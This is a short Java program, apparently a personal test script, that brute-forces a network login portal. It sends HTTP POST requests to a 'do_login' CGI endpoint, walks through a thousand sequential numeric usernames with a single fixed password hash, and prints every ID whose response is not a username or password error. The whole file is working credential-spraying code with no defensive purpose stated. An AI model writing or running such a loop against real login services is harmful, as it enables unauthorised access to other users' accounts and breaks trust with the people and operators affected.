package mplay;

import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpEntity;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

public class NetTest {
	public static void main(String[] args) throws ClientProtocolException,
			IOException {
		CloseableHttpClient httpclient = HttpClients.createDefault();
		for (int user= 21451000;user < 21452000; user++) {
			HttpPost httpPost = new HttpPost("http://192.0.0.6/cgi-bin/do_login");
			List<NameValuePair> nvps = new ArrayList<NameValuePair>();
			nvps.add(new BasicNameValuePair("username", Integer.toString(user)));
			nvps.add(new BasicNameValuePair("password", "65da38ecd0b30a5a"));
			nvps.add(new BasicNameValuePair("drop", "0"));
			nvps.add(new BasicNameValuePair("type", "1"));
			nvps.add(new BasicNameValuePair("n", "100"));
			httpPost.setEntity(new UrlEncodedFormEntity(nvps));
			CloseableHttpResponse response2 = httpclient.execute(httpPost);

			try {
				System.out.println(Integer.toString(user));
				HttpEntity entity2 = response2.getEntity();
				byte[] buffer = new byte[1024];
				InputStream is = entity2.getContent();
				is.read(buffer, 0, buffer.length);
				String result = new String(buffer);
				if(result.startsWith("username_error                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ") /*|| result.startsWith("online_num_error                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ") */|| result.startsWith("password_error")){
					
				}else{
					System.out.print(Integer.toString(user));
					System.out.println(result);
					//System.out.println(result.equals("password_error"));
				}
				// do something useful with the response body
				// and ensure it is fully consumed
				EntityUtils.consume(entity2);
			} finally {
				response2.close();
			}
		}
	}
}
